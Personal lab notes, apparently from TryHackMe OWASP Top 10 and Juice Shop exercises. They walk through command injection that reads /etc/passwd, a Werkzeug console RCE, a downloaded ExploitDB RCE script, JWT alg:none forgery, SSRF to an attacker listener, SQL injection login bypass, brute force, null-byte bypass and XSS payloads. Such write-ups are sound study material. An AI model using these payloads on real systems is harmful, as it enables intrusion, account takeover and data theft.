### OWASP TOP 10

##### Notes 

- after getting hands on `filename.db` file we can open using `$ sqlite3 filename.db` and once the prompt pops up we can do `.tables` to show all tables `PRAGMA table_info(table_name);`       then to dump all data `SELECT * FROM table_name;` and this will give us access to all sensitive data like password hashes, credit card numbers etc.
---

- command injection in `cowsay server` textbox, we can put as `$(ls)` ,`$(whoami)` 
> 	`$(cat /etc/os-release)` - this tells us what version OS is running
> 	`$(cat /etc/passwd)` - this tells us what the user's shell is set as 

---

- Security Misconfiguration in website, we can access the python shell called `Werkzeug console` which is usually placed in web app for debug measures in the debug stage and was forgotten by devs to remove it after debugging and deployment was done.
>	we access the console by `URL/console` and we get the shell 
>	to execute commands we run this on shell
>	`import os; print(os.popen("ls -l").read())` and we can run any command and read contents of files and reveal source code etc.

---
- opening the link we see a CSE online book store vulnerable web app, so head on to exploitDB and search `online book stores` and we can see a `unauthenticated remote code execution` exploit and we download the python script and run it as 
	`$ python3 47887.py URL` - this gives us RCE on a shell and we do `cat /opt/flag.txt` and obtain the flag.
---
- logic flaw in authentication mechanism - if an `admin` user already exists, we have the register option then we can create a ` admin` user with `preceding space` and still gain access to sensitive privileged admin data.
---
- **JWT auth vulnerability** - within the three parts of `Header`,`Payload` & `Signature`, remove the `Signature` part and in `Header` change the key value pair as `alg:none` which says it wont do data integrity check using any algorithm and also change key value pair `username:admin` and update this JWT as a cookie and reload and we get the flag.
---
- **SSRF - Server Side Request Forgery** 
	in URL change the `server=` parameter to our attackbox IP and set a netcat listener by doing 
	`$ nc -lvp 8087` and then put URL 
	`http://10.10.40.18:8087/download?server=10.17.94.67&id=75482342` 
	by doing so we intercept an API key which is our flag here.
	*Going the extra mile:* - accessing the admin panel which says access is only for `local host` 
	so the SSRF will be
	`http://10.10.40.18:8087/download?server=http://127.0.0.1:8087/admin%23&id=75482342`
	here `127.0.0.1` represents the localhost 
	>I figured out that you can use a method similar to SQL injection to break up the server and id in the link (obfuscation). Some forums called it `“escaping the # (hash)”`. To learn more about this read [**here**](https://www.w3schools.com/tags/ref_urlencode.asp?_sm_au_=iVVDMg0TSmrMV6Dm). To break up the server and id we will encode the url’s #, by changing it to `%23`.
	>FLAG - `thm{c4n_i_haz_flagz_plz?}`
---
## OWASP Juice Shop

1. <u>SQL Injection</u>
	username : `' or 1=1--` 
	pass : `blah` - pass doesnt matter
	then
	username : `bender@juice-sh.op'--` 
	pass : `blah` 
---
2. **Bruteforce**:
	bruteforce the administrator password using sniper attack in burpsuite
	*first capture login request*
	then right click and send to `intruder` and then in `positions` tab click on `clear §` button and in password field place `§§` as we will be using that as payload, now we will use the `best1050.txt` wordlist from `/usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt` , we go to payload tab and load it and start the `sniper attack` and we know it is successful when we get a `200 HTTP Code` 
	password is `admin123`  
---
3. **Password Reset exploit** :
	from prev task we know that a user with `jim@juice-sh.op` had given a review and we will reset his password by exploiting the security question, we know `Jim` has something to do with `Startrek` so search in google `Jim star trek` and look for `eldest sibling middle name` which is `Samuel` and reset password and we get flag
---
4.  **Access confidential document**
	about us &rarr; hover over boring terms of use link &rarr; takes to `URL/ftp/legal.md` and downloads legal.md &rarr; change to just `URL/ftp` &rarr; we get confidential files not intended to be accessed. 

	we go to `URL/ftp` and try to download `package.json.bak` but it throws a `403` error saying only `.md` and `.pdf` files can be downloaded but we'll work around using `character bypass` called `Poison Null Byte`.
		poison null byte looks like - `%00` and its actually a `NULL Terminator` and the string tells the server to terminate at that point, nulling the rest of the string.
		so now when put to use, we have to `URL encode` and download through URL 
		`URL/ftp/package.json.bak%2500.md` 
		Note - `%00` when URL encoded is `%2500`
---
5. **XSS/ Cross-Site Scripting attacks**
	- *DOM XSS* :
		first we perform `DOM XSS` by inserting in search bar `<iframe src="javascript:alert('xss')">` 
		this is also called cross-frame scripting .
	- *Persistent XSS* :
		login to admin acc -> Privacy & Security -> Last Login IP -> it will be `10.x.x.x` -> now turn intercept on -> capture logout request and add header `True-Client-IP`: `<iframe src="javascript:alert(`xss`)">` -> now while logging back in to admin acc and navigating to Last Login IP, we can see the XSS alert.
		>Note: The _True-Client-IP_  header is similar to the _X-Forwarded-For_ header, both tell the server or proxy what the IP of the client is. Due to there being no sanitation in the header 
		>we are able to perform an XSS attack.

	- *Reflected XSS* :
		login as admin with email `admin@juice-sh.op` and pass `admin123` -> go to order history -> click on truck symbol -> `http://10.10.224.224/#/track-result?id=5267-f73dcd000abcc353` -> now insert XSS payload in `id parameter` as follows :
		>`http://10.10.224.224/#/track-result?id=_<iframe src="javascript:alert(`xss`)">`
		after submitting URL, refresh page and we get an alert saying `xss`

>		Why does it work?
>		The server will have a lookup table or database (depending on the type of server) for each tracking ID. As the 'id' parameter is not sanitised before it is sent to the server, we are able to perform an XSS attack.
---
